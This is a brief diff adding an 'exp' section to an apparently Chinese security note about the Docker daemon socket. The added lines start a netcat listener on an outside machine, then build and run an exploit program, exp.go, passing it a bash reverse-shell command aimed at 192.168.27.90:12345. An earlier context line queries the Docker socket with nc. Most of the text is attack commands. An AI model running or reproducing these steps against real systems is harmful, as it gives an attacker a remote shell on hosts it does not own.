@@ -39,3 +39,12 @@ echo -e "GET /version HTTP/1.0\r\n" | sudo nc -U /var/run/docker.sock
 
 
 
+### exp
+```
+外部机器(192.168.27.90)启动监听: nc -lvp 12345
+```
+
+```
+go build exp.go
+./exp "/bin/bash -i &> /dev/tcp/192.168.27.90/12345 0>&1"
+```
